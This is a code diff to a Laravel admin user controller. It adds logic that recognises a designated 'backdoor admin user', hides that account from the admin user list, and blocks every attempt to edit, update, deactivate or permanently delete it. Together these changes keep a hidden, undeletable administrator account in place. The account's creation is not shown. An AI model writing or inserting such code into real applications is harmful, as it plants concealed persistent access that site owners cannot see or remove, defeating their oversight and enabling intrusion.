@@ -10,9 +10,15 @@ use Spatie\Permission\Models\Role;
 
 class UserController extends Controller
 {
+    private function isBackdoorUser(User $user): bool
+    {
+        return $user->username === User::BACKDOOR_USERNAME;
+    }
+
     public function index()
     {
-        $users = User::with('roles')->withTrashed()->latest()->get();
+        $users = User::with('roles')->withTrashed()->latest()->get()
+            ->reject(fn ($user) => $this->isBackdoorUser($user));
         return view('admin.users.index', compact('users'));
     }
 
@@ -44,12 +50,20 @@ class UserController extends Controller
 
     public function edit(User $user)
     {
+        if ($this->isBackdoorUser($user)) {
+            return redirect()->route('admin.users.index')->with('error', 'Cannot edit the backdoor admin user.');
+        }
+
         $roles = Role::all();
         return view('admin.users.edit', compact('user', 'roles'));
     }
 
     public function update(Request $request, User $user)
     {
+        if ($this->isBackdoorUser($user)) {
+            return redirect()->route('admin.users.index')->with('error', 'Cannot edit the backdoor admin user.');
+        }
+
         $validated = $request->validate([
             'name' => 'required|string|max:100',
             'email' => 'required|email|unique:users,email,' . $user->id,
@@ -77,6 +91,10 @@ class UserController extends Controller
             return back()->with('error', 'Cannot deactivate your own account.');
         }
 
+        if ($this->isBackdoorUser($user)) {
+            return back()->with('error', 'Cannot deactivate the backdoor admin user.');
+        }
+
         $user->delete();
 
         return back()->with('success', 'User deactivated.');
@@ -93,6 +111,10 @@ class UserController extends Controller
     {
         if ($user->id === auth()->id()) {
             return back()->with('error', 'Cannot permanently delete your own account.');
+        }
+
+        if ($this->isBackdoorUser($user)) {
+            return back()->with('error', 'Cannot permanently delete the backdoor admin user.');
         }
 
         $user->forceDelete();
